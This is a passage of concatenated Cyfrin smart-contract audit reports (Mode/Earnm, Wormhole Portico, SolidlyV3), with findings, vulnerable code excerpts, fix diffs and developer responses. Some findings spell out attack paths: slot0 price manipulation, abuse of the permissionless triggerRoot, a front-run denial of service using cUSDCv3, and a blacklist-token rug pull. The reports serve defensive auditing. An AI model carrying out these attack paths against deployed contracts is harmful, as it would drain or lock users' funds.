2. **Simplify with In-House Tracking:** If the node operator remains the same as the code generation entity, consider simplifying the process. Maintain an on-chain mapping linking codes and addresses to their respective box amounts. Update this mapping each time `apiAddress` triggers `MysteryBox::associateOneTimeCodeToAddress` with the permissible box amount. This streamlined approach would bypass the need for Chainlink oracles and external adapters, reducing LINK fees and complexity while maintaining the current level of centralisation.

We acknowledge that the chosen design was driven by the intent to facilitate the minting of mystery boxes in a single transaction, given the gas limitations associated with VRF (Verifiable Random Function) operations. MODE team's approach was reasonable under these constraints.

**Mode:**
Acknowledged.

\clearpage
## Gas Optimization


### Remove from storage `baseMetadataURI` as already stored in `ERC1155` and `name` as never used

**Description:** Remove from [storage](https://github.com/Earnft/smart-contracts/blob/43d3a8305dd6c7325339ed35d188fe82070ee5c9/contracts/MysteryBox.sol#L53-L54) `baseMetadataURI` as already stored in `ERC1155` & `name` as never used.

**Impact:** Extra storage costs and extra gas to write these unnecessary values to storage.

**Recommended Mitigation:** Remove both `baseMetadataURI` & `name` from storage.

**Mode:**
Fixed in commit [85b2012](https://github.com/Earnft/smart-contracts/commit/85b20121604b5d162bb14c2c96731b8345ca1cb3).

**Cyfrin:** Verified.


### Standardize `tierId` to either `uint8` or `uint256` avoiding constant conversions back and forth

**Description:** Standardize `tierId` to either `uint8` or `uint256` avoiding constant conversions back and forth.

**Impact:** Having different types for `tierId` means it has to be converted but also increases complexity and confusion as to why it is different in some places to others.

**Recommended Mitigation:** Standardize `tierId` to either `uint8` or `uint256`.

**Mode:**
Fixed in commit [85b2012](https://github.com/Earnft/smart-contracts/commit/85b20121604b5d162bb14c2c96731b8345ca1cb3).

**Cyfrin:** Verified.


### Simplify `boxId` storage mappings as `boxId` is unique to addresses and tiers

**Description:** Since `boxId` is unique such that multiple address or tiers can never have the same `boxId`, at least [2 storage mappings](https://github.com/Earnft/smart-contracts/blob/43d3a8305dd6c7325339ed35d188fe82070ee5c9/contracts/MysteryBox.sol#L64-L65) could potentially be simplified: `addressToTierToBoxIdToBlockTs` & `addressToBoxIdToTier`.

Consider refactoring the other nested mappings to simplify and reduce complexity.

**Impact:** The storage mappings are already quite complex which is error-prone and the way these 2 are implemented will require more gas to read/write.

**Recommended Mitigation:** Simplify these mappings by taking advantage of the fact that `boxId` is unique to addresses & tiers.

**Mode:**
Fixed in commit [85b2012](https://github.com/Earnft/smart-contracts/commit/85b20121604b5d162bb14c2c96731b8345ca1cb3), [efa8199](https://github.com/Earnft/smart-contracts/commit/efa8199895c7f5c76b5ac3c81bceaa94c8838eb2), [9c5ac66](https://github.com/Earnft/smart-contracts/commit/9c5ac662180602a3b1addf57c791e562c0ab9cd7).

**Cyfrin:** Verified.


### State variables should be cached in stack variables rather than re-reading them from storage

**Description:** State variables should be cached in stack variables rather than re-reading them from storage.

* `MysteryBox::fulfillRandomWords()` reads `vrfRequests[_requestId]` 3 times; consider reading it once into memory then reading from memory to avoid multiple storage reads.
* `MysteryBox::fulfillBoxAmount()` could cache `eaRequestToAddress[_requestId]` and also `delete addressToRandomNumber[sender]`
* `MysteryBox::_assignTierAndMint()` should have `uint256 newBoxId = ++boxIdCounter;` then use `newBoxId` in the rest of the function.

**Impact:** Gas optimization

**Recommended Mitigation:** State variables should be cached in stack variables rather than re-reading them from storage.

**Mode:**
Fixed in commit [85b2012](https://github.com/Earnft/smart-contracts/commit/85b20121604b5d162bb14c2c96731b8345ca1cb3), [c4c50ed](https://github.com/Earnft/smart-contracts/commit/c4c50edcd2a3f9fc2da4e1934bcfa1d3cbd85809), [d5b14d8](https://github.com/Earnft/smart-contracts/commit/d5b14d80dae0cc78ab63537d405c8c49a6238a57), [5df2b82](https://github.com/Earnft/smart-contracts/commit/5df2b824dba5b25a0d8db28fa10de4a4bc52ec3b).

**Cyfrin:** Verified.


### Loop backwards in `MysteryBox::_determineTier()` to avoid multiple variables and simplify code

**Description:** [Loop backwards](https://github.com/Earnft/smart-contracts/blob/43d3a8305dd6c7325339ed35d188fe82070ee5c9/contracts/MysteryBox.sol#L380-L383) in `MysteryBox::_determineTier()` to avoid multiple variables and simplify code.

**Impact:** Gas optimization and simpler code.

**Recommended Mitigation:** See description.

**Mode:**
Fixed in commit [4d56069](https://github.com/Earnft/smart-contracts/commit/4d560697f7dd6fa4f6b6303cca3e21c4025bee5b).

**Cyfrin:** Verified.


### Simplify calculation in `MysteryBox::_calculateAmountToClaim()`

**Description:** Execute this line every time `return (tokens * (10**EARNM_DECIMALS)) / divisor;` [deleting the other branch](https://github.com/Earnft/smart-contracts/blob/43d3a8305dd6c7325339ed35d188fe82070ee5c9/contracts/MysteryBox.sol#L416-L417) and the useless `%` calculation.

**Impact:** Gas optimization and cleaner, simpler code.

**Recommended Mitigation:** See description.

**Mode:**
Fixed in commit [85b2012](https://github.com/Earnft/smart-contracts/commit/85b20121604b5d162bb14c2c96731b8345ca1cb3).

**Cyfrin:** Verified.


### Remove unused `category` from `MysteryBox::_calculateVestingPeriodPerBox()`

**Description:** Remove [unused](https://github.com/Earnft/smart-contracts/blob/43d3a8305dd6c7325339ed35d188fe82070ee5c9/contracts/MysteryBox.sol#L296) `category` from `MysteryBox::_calculateVestingPeriodPerBox()`.

**Impact:** Gas optimization & simpler, cleaner code.

**Recommended Mitigation:** See description.

**Mode:**
Fixed in commit [85b2012](https://github.com/Earnft/smart-contracts/commit/85b20121604b5d162bb14c2c96731b8345ca1cb3).

**Cyfrin:** Verified.


### Check `boxAmount < 100` only once before loop in `MysteryBox::_assignTierAndMint()`

**Description:** As `boxAmount` input is static, [check `boxAmount < 100`](https://github.com/Earnft/smart-contracts/blob/43d3a8305dd6c7325339ed35d188fe82070ee5c9/contracts/MysteryBox.sol#L479) only once before loop in `MysteryBox::_assignTierAndMint()`.

**Impact:** Gas optimization.

**Recommended Mitigation:** See description.

**Mode:**
Fixed in commit [06a6a4f](https://github.com/Earnft/smart-contracts/commit/06a6a4f6f12e5a52f797af26c4a27a4994fe6ce1).

**Cyfrin:** Verified.

\clearpage

------ FILE END car/reports_md/2023-11-20-cyfrin-mode-earnm.md ------


------ FILE START car/reports_md/2024-01-10-cyfrin-wormhole-thermae.md ------

**Lead Auditors**

[Dacian](https://twitter.com/DevDacian)

[0kage](https://twitter.com/0kage_eth)

**Assisting Auditors**



---

# Findings
## High Risk


### On-chain slippage calculation using exchange rate derived from `pool.slot0` can be easily manipulated

**Description:** [On-chain slippage calculation](https://dacian.me/defi-slippage-attacks#heading-on-chain-slippage-calculation-can-be-manipulated) using price from [`pool.slot0` can be easily manipulated](https://solodit.xyz/issues/h-4-no-slippage-protection-during-repayment-due-to-dynamic-slippage-params-and-easily-influenced-slot0-sherlock-real-wagmi-2-git) causing users to receive less tokens than they intended.

**Impact:** Swaps can result in users receiving less tokens than they intended.

**Proof of Concept:** `Portico::calcMinAmount` attempts to on-chain calculate the minimum amount of tokens a swap should return. It does this using:
1) L85 taking as input either the `maxSlippageStart` or `maxSlippageFinish` parameters which users can specify for the 2 possible swaps,
2) L135 getting the current exchange rate on-chain by reading price information from `pool.slot0`

The problem is that [`pool.slot0` is easy to manipulate using flash loans](https://solodit.xyz/issues/h-02-use-of-slot0-to-get-sqrtpricelimitx96-can-lead-to-price-manipulation-code4rena-maia-dao-ecosystem-maia-dao-ecosystem-git) so the actual exchange rate used in the slippage calculation could be far worse than what the user expects; it is very likely users will be continually exploited via sandwich attacks on the swaps.

**Recommended Mitigation:**
1. If price information is required on-chain, use [Uniswap V3 TWAP](https://docs.uniswap.org/concepts/protocol/oracle) instead of `pool.slot0` for more manipulation-resistant price info (note: this does [not offer the same level of protection on Optimism](https://docs.uniswap.org/concepts/protocol/oracle#oracles-integrations-on-layer-2-rollups)),
2. Use `minAmountReceivedStart` and `minAmountReceivedFinish` parameters instead of  `maxSlippageStart` and `maxSlippageFinish` and remove the on-chain slippage calculation. There is no "safe" way to calculate slippage on-chain. If users specify % slippage params, calculate the exact minimum amounts off-chain and pass these in as input.

**Wormhole:**
Fixed in commit af089d6.

**Cyfrin:** Verified.

\clearpage
## Medium Risk


### Checking `bool` return of ERC20 `approve` and `transfer` breaks protocol for mainnet USDT and similar tokens which don't return true

**Description:** Checking `bool` return of ERC20 `approve` and `transfer` breaks protocol for mainnet USDT and similar tokens which [don't return true](https://etherscan.io/token/0xdac17f958d2ee523a2206206994597c13d831ec7#code) even though the calls were successful.

**Impact:** Protocol won't work with mainnet USDT and similar tokens.

**Proof of Concept:** Portico.sol L58, 61, 205, 320, 395, 399.

**Recommended Mitigation:** Use [SafeERC20](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol) or [SafeTransferLib](https://github.com/transmissions11/solmate/blob/main/src/utils/SafeTransferLib.sol).

**Wormhole:**
Fixed in commits 3f08be9 & 55f93e2.

**Cyfrin:** Verified.


### No precision scaling or minimum received amount check when subtracting `relayerFeeAmount` can revert due to underflow or return less tokens to user than specified

**Description:** `PorticoFinish::payOut` L376 attempts to subtract the `relayerFeeAmount` from the final post-bridge and post-swap token balance:
```solidity
finalUserAmount = finalToken.balanceOf(address(this)) - relayerFeeAmount;
```

There is [no precision scaling](https://dacian.me/precision-loss-errors#heading-no-precision-scaling) to ensure that `PorticoFinish`'s token contract balance and `relayerFeeAmount` are in the same decimal precision; if the `relayerFeeAmount` has 18 decimal places but the token is USDC with only 6 decimal places, this can easily revert due to underflow resulting in the bridged tokens being stuck.

An excessively high `relayerFeeAmount` could also significantly reduce the amount of post-bridge and post-swap tokens received as there is no check on the minimum amount of tokens the user will receive after deducting `relayerFeeAmount`. This current configuration is an example of the ["MinTokensOut For Intermediate, Not Final Amount"](https://dacian.me/defi-slippage-attacks#heading-mintokensout-for-intermediate-not-final-amount) vulnerability class; as the minimum received tokens check is before the deduction of `relayerFeeAmount` a user will always receive less tokens than their specified minimum if `relayerFeeAmount > 0`.

**Impact:** Bridged tokens stuck or user receives less tokens than their specified minimum.

**Recommended Mitigation:** Ensure that token balance and `relayerFeeAmount` have the same decimal precision before combining them. Alternatively check for underflow and don't charge a fee if this would be the case. Consider enforcing the user-specified minimum output token check again when deducting `relayerFeeAmount`, and if this would fail then decrease `relayerFeeAmount` such that the user at least receives their minimum specified token amount.

Another option is to check that even if it doesn't underflow, that the remaining amount after subtracting `relayerFeeAmount` is a high percentage of the bridged amount; this would prevent a scenario where `relayerFeeAmount` takes a large part of the bridged amount, effectively capping `relayerFeeAmount` to a tiny % of the post-bridge and post-swap funds. This scenario can still result in the user receiving less tokens than their specified minimum however.

From the point of view of the smart contract, it should protect itself against the possibility of the token amount and `relayerFeeAmount` being in different decimals or that `relayerFeeAmount` would be too high, similar to how for example L376 inside `payOut` doesn't trust the bridge reported amount and checks the actual token balance.

**Wormhole:**
Fixed in commit 05ba84d by adding an underflow check. Any misbehavior is due to bad user input and should be corrected off-chain. Only the user is able to set the relayer fee in the input parameters.

**Cyfrin:** Verified potential underflow due to mismatched precision between relayer fee & token amount is now handled. The implementation now favors the relayer however this is balanced by the fact that only the user can set the relayer fee, so the attack surface is limited to self-inflicted harm. If in the future another entity such as the relayer could set the relayer fee then this could be used to drain the bridged tokens, but with the current implementation this is not possible unless the user sets an incorrectly large relayer fee which is self-inflicted.

\clearpage
## Low Risk


### Use low level `call()` to prevent gas griefing attacks when returned data not required

**Description:** Using `call()` when the returned data is not required unnecessarily exposes to gas griefing attacks from huge returned data payload. For example:
```solidity
(bool sentToUser, ) = recipient.call{ value: finalUserAmount }("");
require(sentToUser, "Failed to send Ether");
```

Is the same as writing:
```solidity
(bool sentToUser, bytes memory data) = recipient.call{ value: finalUserAmount }("");
require(sentToUser, "Failed to send Ether");
```

In both cases the returned data will be copied into memory exposing the contract to gas griefing attacks, even though the returned data is not used at all.

**Impact:** Contract unnecessarily exposed to gas griefing attacks.

**Recommended Mitigation:** Use a low-level call when the returned data is not required, eg:
```solidity
bool sent;
assembly {
    sent := call(gas(), recipient, finalUserAmount, 0, 0, 0, 0)
}
if (!sent) revert Unauthorized();
```

Consider using [ExcessivelySafeCall](https://github.com/nomad-xyz/ExcessivelySafeCall).

**Wormhole:**
Fixed in commit 5f3926b.

**Cyfrin:** Verified.

\clearpage
## Informational


### Missing sanity check for address validity in `PorticoBase::unpadAddress`

**Description:** `PorticoBase::unpadAddress` is a re-implementation of [`Utils::fromWormholeFormat`](https://github.com/wormhole-foundation/wormhole-solidity-sdk/blob/main/src/Utils.sol#L10-L15) from the Wormhole Solidity SDK, but is missing a sanity check for address validity which is in the SDK implementation.

**Recommended Mitigation:** Consider adding the address validity sanity check to `PorticoBase::unpadAddress`.

**Wormhole:**
Fixed in commit 6208dd1.

**Cyfrin:** Verified.


### Move payable `receive()` function from `PorticoBase` into `PorticoFinish`

**Description:** Move payable `receive()` function from `PorticoBase` into `PorticoFinish` since `PorticoFinish` is the only contract which needs to receive eth when it calls `WETH.withdraw()`.

`PorticoStart` which also inherits from `PorticoBase` never needs to receive eth apart from the payable `start` function, so does not need to have or inherit a payable `receive()` function.

**Wormhole:**
Fixed in commit 6208dd1.

**Cyfrin:** Verified.


### `Portico::start` not used internally could be marked external

**Description:** `Portico::start` not used internally could be marked external.

**Wormhole:**
Fixed in commit 6208dd1.

**Cyfrin:** Verified.


### `TokenBridge::isDeployed` could be declared pure

**Description:** `TokenBridge::isDeployed` could be declared pure. Also not sure what the point of this contract is; if it is used for testing perhaps move it into a `mocks` directory.

**Wormhole:**
Removed this contract.

**Cyfrin:** Verified.


### Remove unused code

**Description:**
```solidity
File: PorticoStructs.sol L67-79:
  //16 + 32 + 24 + 24 + 16 + 16 + 8 + 8 == 144
  struct packedData {
    uint16 recipientChain;
    uint32 bridgeNonce;
    uint24 startFee;
    uint24 endFee;
    int16 slipStart;
    int16 slipEnd;
    bool wrap;
    bool unwrap;
  }
```

**Wormhole:**
Fixed in commit 6208dd1.

**Cyfrin:** Verified.

\clearpage
## Gas Optimization


### Fail fast in `_completeTransfer` by checking for incorrect address/chainId immediately after calling `TOKENBRIDGE.parseTransferWithPayload`

**Description:** Fail fast in `_completeTransfer` by checking for incorrect address/chainId immediately after calling `TOKENBRIDGE.parseTransferWithPayload` per the [example code](https://docs.wormhole.com/wormhole/quick-start/tutorials/hello-token#receiving-a-token).

**Impact:** Gas optimization; want to fail fast instead of performing a number of unnecessary operations then failing later anyway.

**Proof of Concept:** Portico.sol L278-300.

**Recommended Mitigation:** Perform the L300 check immediately after L278.

**Wormhole:**
Fixed in commit 5f3926b.

**Cyfrin:** Verified.


### Don't initialize variables with default value

**Description:** Don't initialize variables with default value, eg in `TickMath::getTickAtSqrtRatio()`:

```solidity
uint256 msb = 0;
```

**Impact:** Gas optimization.

**Wormhole:**
`TickMath` is no longer used as on chain slippage calculations are not being done anymore.


### Use custom errors instead of revert error strings

**Description:** Using custom errors instead of revert error strings to reduce deployment and runtime cost:

```solidity
File: Portico.sol

64:         require(token.approve(spender, 0), "approval reset failed");

67:       require(token.approve(spender, 2 ** 256 - 1), "infinite approval failed");

185:     require(poolExists, "Pool does not exist");

215:       require(value == params.amountSpecified + whMessageFee, "msg.value incorrect");

225:       require(value == whMessageFee, "msg.value incorrect");

232:       require(params.startTokenAddress.transferFrom(_msgSender(), address(this), params.amountSpecified), "transfer fail");

240:       require(amount >= params.amountSpecified, "transfer insufficient");

333:     require(unpadAddress(transfer.to) == address(this) && transfer.toChain == wormholeChainId, "Token was not sent to this address");

420:         require(sentToUser, "Failed to send Ether");

425:         require(sentToRelayer, "Failed to send Ether");

432:         require(finalToken.transfer(recipient, finalUserAmount), "STF");

436:         require(finalToken.transfer(feeRecipient, relayerFeeAmount), "STF");
```

**Wormhole:**
Error strings have all been confirmed to be length < 32, this is sufficient for the purposes of this contract.

\clearpage

------ FILE END car/reports_md/2024-01-10-cyfrin-wormhole-thermae.md ------


------ FILE START car/reports_md/2024-01-24-cyfrin-solidlyV3.md ------

**Lead Auditors**

[Dacian](https://twitter.com/DevDacian)
 
[Carlitox477](https://twitter.com/carlitox477)

**Assisting Auditors**

  


---

# Findings
## Medium Risk


### Attacker can abuse `RewardsDistributor::triggerRoot` to block reward claims and unpause a paused state

**Description:** Consider the code of [`RewardsDistributor::triggerRoot`](https://github.com/SolidlyV3/v3-rewards/blob/6dfb435392ffa64652c8f88c98698756ca80cf28/contracts/RewardsDistributor.sol#L511-L516):
```solidity
    function triggerRoot() external {
        bytes32 rootCandidateAValue = rootCandidateA.value;
        if (rootCandidateAValue != rootCandidateB.value || rootCandidateAValue == bytes32(0)) revert RootCandidatesInvalid();
        root = Root({value: rootCandidateAValue, lastUpdatedAt: block.timestamp});
        emit RootChanged(msg.sender, rootCandidateAValue);
    }
```

This function:
* can be called by anyone
* if it succeeds, sets `root.value` to `rootCandidateA.value` and `root.lastUpdatedAt` to `block.timestamp`
* doesn't reset `rootCandidateA` or `rootCandidateB`, so it can be called over and over again to continually update `root.lastUpdatedAt` or to set `root.value` to `rootCandidateA.value`.

**Impact:** An attacker can abuse this function in 2 ways:
* by calling it repeatedly an attacker can continually increase `root.lastUpdatedAt` to trigger the [claim delay revert](https://github.com/SolidlyV3/v3-rewards/blob/6dfb435392ffa64652c8f88c98698756ca80cf28/contracts/RewardsDistributor.sol#L190-L191) in `RewardsDistributor::claimAll` effectively blocking reward claims
* by calling it after reward claims have been paused, an attacker can effectively unpause the paused state since `root.value` is over-written with the valid value from `rootCandidateA.value` and claim pausing [works](https://github.com/SolidlyV3/v3-rewards/blob/6dfb435392ffa64652c8f88c98698756ca80cf28/contracts/RewardsDistributor.sol#L547) by setting `root.value == zeroRoot`.

**Recommended Mitigation:** Two possible options:
* Make `RewardsDistributor::triggerRoot` a permissioned function such that an attacker can't call it
* Change `RewardsDistributor::triggerRoot` to reset `rootCandidateA.value = zeroRoot` such that it can't be successfully called repeatedly.

**Solidly:**
Fixed in commits [653c196](https://github.com/SolidlyV3/v3-rewards/commit/653c19659474c93ef0958479191d8103bc7b7e82) & [1170eac](https://github.com/SolidlyV3/v3-rewards/commit/1170eacc9b08bed9453a34fdf498f8bb10457f17).

**Cyfrin:**
Verified. One consequence of the updated implementation is that the contract will start in the "paused" state and root candidates will be unable to be set. This means that the admin will have to set the first valid root via `setRoot` in order to "unpause" from the initial state post-deployment.


### `RewardsDistributor` doesn't correctly handle deposits of fee-on-transfer incentive tokens

**Description:** `the kenneth` stated in telegram that Fee-On-Transfer tokens are fine to use as incentive tokens with `RewardsDistributor`, however when receiving Fee-On-Transfer tokens and storing the reward amount the accounting does not account for the fee deducted from the transfer amount in-transit, [for example](https://github.com/SolidlyV3/v3-rewards/blob/6dfb435392ffa64652c8f88c98698756ca80cf28/contracts/RewardsDistributor.sol#L348-L359):

```solidity
function _depositLPIncentive(
    StoredReward memory reward,
    uint256 amount,
    uint256 periodReceived
) private {
    IERC20(reward.token).safeTransferFrom(
        msg.sender,
        address(this),
        amount
    );

    // @audit stored `amount` here will be incorrect since it doesn't account for
    // the actual amount received after the transfer fee was deducted in-transit
    _storeReward(periodReceived, reward, amount);
}
```

**Impact:** The actual reward calculation is done off-chain and is outside the audit scope nor do we have visibility of that code. But events emitted by `RewardsDistributor` and the stored incentive token deposits in `RewardsDistributor::periodRewards` use incorrect amounts for Fee-On-Transfer incentive token deposits.

**Recommended Mitigation:** In `RewardsDistributor::_depositLPIncentive` & `depositVoteIncentive`:
* read the `before` transfer token balance of `RewardsDistributor` contract
* perform the token transfer
* read the `after` transfer token balance of `RewardsDistributor` contract
* calculate the difference between the `after` and `before` balances to get the true amount that was received by the `RewardsDistributor` contract accounting for the fee that was deducted in-transit
* use the true received amount to generate events and write the received incentive token amounts to `RewardsDistributor::periodRewards`.

Also note that `RewardsDistributor::periodRewards` is never read in the contract, only written to. If it is not used by off-chain processing then consider removing it.

**Solidly:**
Fixed in commit [be54da1](https://github.com/SolidlyV3/v3-rewards/commit/be54da1fea0f1f6f3e4c6ee20464b962cbe2077f).

**Cyfrin:**
Verified.


### Attacker can corrupt `RewardsDistributor` internal accounting forcing LP token incentive deposits to revert for tokens like `cUSDCv3`

**Description:** Some tokens like [cUSDCv3](https://etherscan.io/address/0x9e4dde024f7ea5cf13d5f09c51a1555305c99f0c#code#F1#L930) contains a special case for `amount == type(uint256).max` in their transfer functions that results in only the user's balance being transferred.

For such tokens in this case incentive deposits via `depositLPTokenIncentive` will transfer less tokens than expected. The consequence of this is if a protocol like Compound wanted to incentivize a pool with a token like `cUSDCv3`, an attacker can front-run their transaction to corrupt the internal accounting forcing it to revert.

**Impact:** Corrupted accounting for incentive reward deposits with tokens like `cUSDCv3` can be exploited to deny future incentive reward deposits using the same token.

**POC:**
Consider the following functions:
```solidity
function _validateIncentive(
    address token,
    uint256 amount,
    uint256 distributionStart,
    uint256 numDistributionPeriods
) private view {
    // distribution must start on future epoch flip and last for [1, max] periods
    if (
        numDistributionPeriods == 0                  || // Distribution in 0 periods is invalid
        numDistributionPeriods > maxIncentivePeriods || // Distribution over max period is invalid
        distributionStart % EPOCH_DURATION != 0      || // Distribution must start at the beginning of a week
        distributionStart < block.timestamp             // Distribution must start in the future
    ) revert InvalidIncentiveDistributionPeriod();

    // approvedIncentiveAmounts indicates the min amount of
    // tokens to distribute per period for a whitelisted token
    uint256 minAmount = approvedIncentiveAmounts[token] * numDistributionPeriods;

    // @audit validation passes for `amount == type(uint256).max`
    if (minAmount == 0 || amount < minAmount)
        revert InvalidIncentiveAmount();
}

function _depositLPIncentive(
    StoredReward memory reward,
    uint256 amount,
    uint256 periodReceived
) private {
    // @audit does not guarantee that `amount`
    // is transferred if `amount == type(uint256).max`
    IERC20(reward.token).safeTransferFrom(msg.sender, address(this), amount);

    // @audit incorrect `amount` will be stored in this case
    _storeReward(periodReceived, reward, amount);
}
```
If a protocol like Compound wanted to incentivize a pool with a token like `cUSDCv3` for 2 periods:
1. Bob see this in the mempool and calls `RewardsDistributor.depositLPTokenIncentive(pool that compound want to incentivize, cUSDCv3, type(uint256).max, distribution start to DOS, valid numDistributionPeriods)`
2. When Compound try to do a valid call, `_storeReward` will revert because `periodRewards[period][rewardKey] += amount` will overflow since its amount value is `type(uint256).max` due to Bob's front-run transaction.


**Recommended mitigation:**
One possible solution:

1) Divide `_validateIncentive` into 2 functions:

```solidity
function _validateDistributionPeriod(
    uint256 distributionStart,
    uint256 numDistributionPeriods
) private view {
    // distribution must start on future epoch flip and last for [1, max] periods
    if (
        numDistributionPeriods == 0                  || // Distribution in 0 periods is invalid
        numDistributionPeriods > maxIncentivePeriods || // Distribution over max period is invalid
        distributionStart % EPOCH_DURATION != 0      || // Distribution must start at the beginning of a week
        distributionStart < block.timestamp             // Distribution must start in the future
    ) revert InvalidIncentiveDistributionPeriod();
}

// Before calling this function, _validateDistributionPeriod must be called
function _validateIncentive(
    address token,
    uint256 amount,
    uint256 numDistributionPeriods
) private view {
    uint256 minAmount = approvedIncentiveAmounts[token] * numDistributionPeriods;

    if (minAmount == 0 || amount < minAmount)
        revert InvalidIncentiveAmount();
}
```

2) Change `_depositLPIncentive` to return the actual amount received and call `_validateIncentive`:

```diff
function _depositLPIncentive(
    StoredReward memory reward,
+   uint256 numDistributionPeriods
    uint256 amount,
    uint256 periodReceived
-) private {
+) private returns(uint256 actualDeposited) {
+   uint256 tokenBalanceBeforeTransfer = IERC20(reward.token).balanceOf(address(this));
    IERC20(reward.token).safeTransferFrom(
        msg.sender,
        address(this),
        amount
    );
-   _storeReward(periodReceived, reward, amount);
+   actualDeposited = IERC20(reward.token).balanceOf(address(this)) - tokenBalanceBeforeTransfer;
+   _validateIncentive(reward.token, actualDeposited, numDistributionPeriods);
+   _storeReward(periodReceived, reward, actualDeposited);
}
```

3) Change `depositLPTokenIncentive` to use the new functions, read the actual amount returned and use that in the event emission:

```diff
function depositLPTokenIncentive(
    address pool,
    address token,
    uint256 amount,
    uint256 distributionStart,
    uint256 numDistributionPeriods
) external {
-   _validateIncentive(
-       token,
-       amount,
-       distributionStart,
-       numDistributionPeriods
-   );
+   // Verify that number of period is and start time is valid
+   _validateDistributionPeriod(
+       uint256 distributionStart,
+       uint256 numDistributionPeriods
+   );
    StoredReward memory reward = StoredReward({
        _type: StoredRewardType.LP_TOKEN_INCENTIVE,
        pool: pool,
        token: token
    });
    uint256 periodReceived = _syncActivePeriod();
-   _depositLPIncentive(reward, amount, periodReceived);
+   uint256 actualDeposited = _depositLPIncentive(reward, amount, periodReceived);

    emit LPTokenIncentiveDeposited(
        msg.sender,
        pool,
        token,
-       amount,
+       actualDeposited
        periodReceived,
        distributionStart,
        distributionStart + (EPOCH_DURATION * numDistributionPeriods)
    );
}
```

This mitigation also resolves the issue related to incorrect accounting for fee-on-transfer tokens.

**Solidly:**
Fixed in commit [be54da1](https://github.com/SolidlyV3/v3-rewards/commit/be54da1fea0f1f6f3e4c6ee20464b962cbe2077f).

**Cyfrin:**
Verified.

\clearpage
## Low Risk


### Use low level `call()` to prevent gas griefing attacks when returned data not required

**Description:** Using `call()` when the returned data is not required unnecessarily exposes to gas griefing attacks from huge returned data payload. For [example](https://github.com/SolidlyV3/v3-rewards/blob/6dfb435392ffa64652c8f88c98698756ca80cf28/contracts/RewardsDistributor.sol#L563-L564):

```solidity
(bool sent, ) = _to.call{value: _amount}("");
require(sent);
```

Is the same as writing:

```solidity
(bool sent, bytes memory data) = _to.call{value: _amount}("");
require(sent);
```

In both cases the returned data will be copied into memory exposing the contract to gas griefing attacks, even though the returned data is not used at all.

**Impact:** Contract unnecessarily exposed to gas griefing attacks.

**Recommended Mitigation:** Use a low-level call when the returned data is not required, eg:

```solidity
bool sent;
assembly {
    sent := call(gas(), _to, _amount, 0, 0, 0, 0)
}
if (!sent) revert FailedToSendEther();
```

**Solidly:**
Fixed in commit [be54da1](https://github.com/SolidlyV3/v3-rewards/commit/be54da1fea0f1f6f3e4c6ee20464b962cbe2077f).

**Cyfrin:**
Verified.


### Check for valid pool in `RewardsDistributor::depositLPSolidEmissions`, `depositLPTokenIncentive` and `_collectPoolFees`

**Description:** `RewardsDistributor::depositLPSolidEmissions` and `depositLPTokenIncentive` contain no validation that `pool` is a valid pool address, while `depositVoteIncentive` does perform some validation of the pool parameter. Consider adding validation to ensure LP emissions/incentives are recorded against a valid `pool` parameter.

Similarly `RewardsDistributor::_collectPoolFees` never validates if the pool is legitimate and anyone can call its parent function `collectPoolFees`. An attacker could create their own fake pool which implements `ISolidlyV3PoolMinimal::collectProtocol` but doesn't transfer any tokens just returns large output amounts, and for `token0` and `token1` return the address of popular high-profile tokens.

This could make it appear like `RewardsDistributor` has received significantly more rewards than it actually has by corrupting the event log and `periodRewards` storage location with false information. Consider validating the pool in `RewardsDistributor::_collectPoolFees` and potentially whether `RewardsDistributor` has actually received the tokens.

Also note that `RewardsDistributor::periodRewards` is never read in the contract, only written to. If it is not used by off-chain processing then consider removing it.

**Solidly:**
Acknowledged. The off-chain processor only computes pools that are validated through the factory.


### `SolidlyV3Pool::_mint` and `_swap` don't verify tokens were actually received by the pool

**Description:** Some versions of [`SolidlyV3Pool::_mint`](https://github.com/SolidlyV3/v3-core/blob/main/contracts/SolidlyV3Pool.sol#L288-L291) & [`_swap`](https://github.com/SolidlyV3/v3-core/blob/callbacks/contracts/SolidlyV3Pool.sol#L644-L650) don't verify tokens were actually received by the pool. In contrast UniswapV3's equivalent [`mint`](https://github.com/Uniswap/v3-core/blob/main/contracts/UniswapV3Pool.sol#L483-L484) & [`swap`](https://github.com/Uniswap/v3-core/blob/main/contracts/UniswapV3Pool.sol#L777-L783) functions always verify tokens were received by the pool.

**Impact:** Solidly will be more vulnerable to malicious tokens or tokens with non-standard behavior. One possible attack path is a token which has a blacklist that doesn't process transfers for blacklisted accounts but also doesn't revert and simply returns `true`. The token owner can execute a more subtle rug-pull by:
* allowing the pool to grow to a sufficient size
* adding themselves to the blacklist
* calling `swap` to drain the other token without actually transferring any of the malicious token, draining the liquidity pool.

**Recommended Mitigation:** `_mint` and `_swap` functions should check that the expected token amounts were transferred into the pool.

**Solidly:**
We ommited this on purpose for gas savings since we don't support exotic ERC20s on v3-core. Users can create such a pool if they want since it's permission-less, but it's something we explicitly and officially don't support.


### Change `v3-rewards/package.json` to require minimum OpenZeppelin v4.9.2 as prior versions had a security vulnerability in Merkle Multi Proof

**Description:** `v3-rewards/package.json` currently [specifies](https://github.com/SolidlyV3/v3-rewards/blob/6dfb435392ffa64652c8f88c98698756ca80cf28/package.json#L7) a minimum OpenZeppelin version of 4.5.0. However some older OZ versions contained a security [vulnerability](https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-wprv-93r4-jj2p) in the Merkle Multi Proof which was fixed in 4.9.2.

**Recommended Mitigation:** Change `v3-rewards/package.json` to require minimum OpenZeppelin v4.9.2:
```solidity
"@openzeppelin/contracts": "^4.9.2",
```

**Solidly:**
Fixed in commit [6481747](https://github.com/SolidlyV3/v3-rewards/commit/6481747737b98c8650a36f87b1aeace815505ba9).

**Cyfrin:**
Verified.

\clearpage
## Informational


### Refactor hard-coded max pool fee into a constant as it is used in multiple places

**Description:** `100000` is the hard-coded max pool fee. There are two require statements enforcing this hard-coded value in `SolidlyV3Factory::enableFeeAmount` [L90](https://github.com/SolidlyV3/v3-core/blob/main/contracts/SolidlyV3Factory.sol#L90) and `SolidlyV3Pool::setFee` [L794](https://github.com/SolidlyV3/v3-core/blob/main/contracts/SolidlyV3Pool.sol#L794).

Using the same hard-coded value in multiple places throughout the code is error-prone as when making future code updates a developer can easily update one place but forget to update the others; recommend refactoring to use a constant which can be referenced instead of hard-coding.

**Solidly:**
Acknowledged.


### Prefer explicit function for renouncing ownership and 2-step ownership transfer

